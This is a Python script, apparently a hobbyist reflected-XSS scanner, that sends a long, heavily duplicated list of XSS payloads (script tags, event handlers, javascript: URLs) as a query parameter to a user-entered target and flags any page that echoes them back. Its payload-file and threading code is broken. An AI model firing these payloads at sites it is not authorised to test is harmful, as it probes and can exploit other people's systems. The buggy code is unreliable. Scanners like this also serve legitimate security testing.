import requests
import re
import threading

def print_banner():
    print("""\033[1;31m
          
       @@@  @@@  @@@  @@@  @@@   @@@@@@@@   @@@  @@@   @@@@@@    @@@@@@   
       @@@  @@@  @@@  @@@  @@@  @@@@@@@@@@  @@@  @@@  @@@@@@@   @@@@@@@   
       @@!  @@!  @@!  @@!  @@@  @@!   @@@@  @@!  !@@  !@@       !@@       
       !@!  !@!  !@!  !@!  @!@  !@!  @!@!@  !@!  @!!  !@!       !@!       
       @!!  !!@  @!@  @!@!@!@!  @!@ @! !@!   !@@!@!   !!@@!!    !!@@!!    
       !@!  !!!  !@!  !!!@!!!!  !@!!!  !!!    @!!!     !!@!!!    !!@!!!   
       !!:  !!:  !!:  !!:  !!!  !!:!   !!!   !: :!!        !:!       !:!  
       :!:  :!:  :!:  :!:  !:!  :!:    !:!  :!:  !:!      !:!       !:!   
        :::: :: :::   ::   :::  ::::::: ::   ::  :::  :::: ::   :::: ::   
         :: :  : :     :   : :   : : :  :    :   ::   :: : :    :: : : by: wh0is             
          
          \033[0;0m""")
    
def testing_xss(url, payload):
    try:
        response = requests.get(url, params={'q': payload})
        if re.search(re.escape(payload), response.text, re.IGNORECASE):
            print(f"\n  \033[1;32m[+] vulnerable! {url} with payload: {payload}\033[0;0m\n")
        else:
            print(f"\n  \033[1;31m[-] safe! {url} with payload: {payload}\033[0;0m\n")
    except requests.RequestException as error:
        print("[!] error: {}".format(error))
        
def with_open():
    print_banner()
    payl = input("  [>] DIRECTORY PAYLOADS: ")
    global target
    target = input("  [>] TARGET: ")
    try:
        if not payl or payl == '':
            for payload in p:
                testing_xss(target, payload)
            print("\n  bye...!\n")
        with open(payl, 'r') as file:
            paylo = file.read().splitlines()
        return paylo
    except Exception as e:
        print("  [!] error: {}".format(e))
        exit()
        
if __name__ == "__main__":
    p = [
        
    "<script>alert('XSS1')</script>",
    "<img src='x' onerror='alert(1)'>",
    "'\"><script>alert(1)</script>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    "<object data='javascript:alert(\"XSS\")'>",
    "<embed src='javascript:alert(\"XSS\")'>",
    "<style>@import'javascript:alert(\"XSS\")';</style>",
    "<xml><script>alert('XSS')</script></xml>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<base href='javascript:alert(\"XSS\")//'>",
    "<form action='javascript:alert(\"XSS\")'>",
    "<input type='button' onclick='alert(\"XSS\")' value='Click Me'>",
    "<a href='javascript:alert(\"XSS\")'>Click Me</a>",
    "<img src=x onerror=alert('XSS')>",
    "<div onmouseover=alert('XSS')>Hover Me</div>",
    "<input type='image' src='x' onerror='alert(\"XSS\")'>",
    "<link rel='stylesheet' href='javascript:alert(\"XSS\")'>",
    "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\")'>",
    "<marquee onstart=alert('XSS')>XSS</marquee>",
    "<table background='javascript:alert(\"XSS\")'>",
    "<template><img src=x onerror=alert('XSS')></template>",
    "<audio src='x' onerror='alert(\"XSS\")'></audio>",
    "<video src='x' onerror='alert(\"XSS\")'></video>",
    "<details open ontoggle=alert('XSS')>XSS</details>",
    "<plaintext><script>alert('XSS')</script></plaintext>",
    "<xmp><script>alert('XSS')</script></xmp>",
    "<title onpropertychange=alert('XSS')>XSS</title>",
    "<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>",
    "<style>body{background:url('javascript:alert(\"XSS\")')}</style>",
    "<bgsound src='x' onerror='alert(\"XSS\")'>",
    "<div oncontextmenu=alert('XSS')>Right Click Me</div>",
    "<isindex action='javascript:alert(\"XSS\")'>",
    "<base href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
    "<math href='javascript:alert(\"XSS\")'>",
    "<meta charset='UTF-7'><script>alert('XSS')</script>",
    "<iframe srcdoc='<script>alert(\"XSS\")</script>'></iframe>",
    "<keygen autofocus onfocus=alert('XSS')>",
    "<progress value=0 max=10 onprogress=alert('XSS')></progress>",
    "<meter onmouseover=alert('XSS')>XSS</meter>",
    "<select onfocus=alert('XSS')><option>XSS</option></select>",
    "<textarea onfocus=alert('XSS')>XSS</textarea>",
    "<input type='file' onfocus=alert('XSS')>",
    "<object type='text/html' data='javascript:alert(\"XSS\")'></object>",
    "<dialog open onclose=alert('XSS')>XSS</dialog>",
    "<track src='x' onerror='alert(\"XSS\")'></track>",
    "<bgsound src='x' onerror='alert(\"XSS\")'>",
    "<form><button formaction='javascript:alert(\"XSS\")'>XSS</button></form>",
    "<applet code='javascript:alert(\"XSS\")'></applet>",
    "<img src='x' onerror='alert(1)'>",
    "<audio onerror=alert('XSS') src='invalid'></audio>",
    "<video onerror=alert('XSS')><source src='invalid'></video>",
    "<form><input type=submit formaction=javascript:alert(1)></form>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<a href=javascript:alert(1)>Click me</a>",
    "<embed src=javascript:alert(1)>",
    "<object data=javascript:alert(1)>",
    "<button formaction=javascript:alert(1)>Click me</button>",
    "<svg/onload=alert(1)>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<xmp><script>alert(1)</script></xmp>",
    "<isindex action=javascript:alert(1)>",
    "<plaintext><script>alert(1)</script></plaintext>",
    "<input type=image src='x' onerror=alert(1)>",
    "<div oncontextmenu=alert(1)>Right click me</div>",
    "<style>@import'javascript:alert(1)';</style>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<meta charset='UTF-7'><script>alert(1)</script>",
    "<math href='javascript:alert(1)'>",
    "<dialog onclose=alert(1)>XSS</dialog>",
    "<track src='x' onerror='alert(1)'></track>",
    "<template><img src='x' onerror=alert(1)></template>",
    "<title onpropertychange=alert(1)>XSS</title>",
    "<base href='javascript:alert(1)//'>",
    "<audio src='x' onerror=alert(1)></audio>",
    "<video src='x' onerror=alert(1)></video>",
    "<select onfocus=alert(1)><option>XSS</option></select>",
    "<textarea onfocus=alert(1)>XSS</textarea>",
    "<input type='file' onfocus=alert(1)>",
    "<object type='text/html' data=javascript:alert(1)></object>",
    "<dialog open onclose=alert(1)>XSS</dialog>",
    "<track src='x' onerror=alert(1)></track>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<base href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<button formaction=javascript:alert(1)>Click me</button>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<button formaction=javascript:alert(1)>Click me</button>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<base href='javascript:alert(1)//'>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "<style>body{background:url('javascript:alert(1)')}</style>",
    "<bgsound src='x' onerror=alert(1)>",
    "<div oncontextmenu=alert(1)>Right click me</div>",
    "<input type=image src='x' onerror=alert(1)>",
    "<style>@import'javascript:alert(1)';</style>",
    "<meta charset='UTF-7'><script>alert(1)</script>",
    "<math href='javascript:alert(1)'>",
    "<dialog onclose=alert(1)>XSS</dialog>",
    "<track src='x' onerror=alert(1)></track>",
    "<template><img src='x' onerror=alert(1)></template>",
    "<title onpropertychange=alert(1)>XSS</title>",
    "<base href='javascript:alert(1)//'>",
    "<audio src='x' onerror=alert(1)></audio>",
    "<video src='x' onerror=alert(1)></video>",
    "<select onfocus=alert(1)><option>XSS</option></select>",
    "<textarea onfocus=alert(1)>XSS</textarea>",
    "<input type='file' onfocus=alert(1)>",
    "<object type='text/html' data=javascript:alert(1)></object>",
    "<dialog open onclose=alert(1)>XSS</dialog>",
    "<track src='x' onerror=alert(1)></track>",
    "<link rel=stylesheet href=javascript:alert(1)>",
    "<base href='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",
    "<form action='javascript:alert(1)'><input type=submit></form>",
    "<button formaction=javascript:alert(1)>Click me</button>",
    
    ]   
    
    try:
            with_open()
            #target = input("  [>] TARGET: ")     
    except KeyboardInterrupt:
        print("\n\n    ...bye...!\n")
        exit()
    
threading.Thread(target=with_open()).start()
threading.Thread(target=testing_xss()).start()
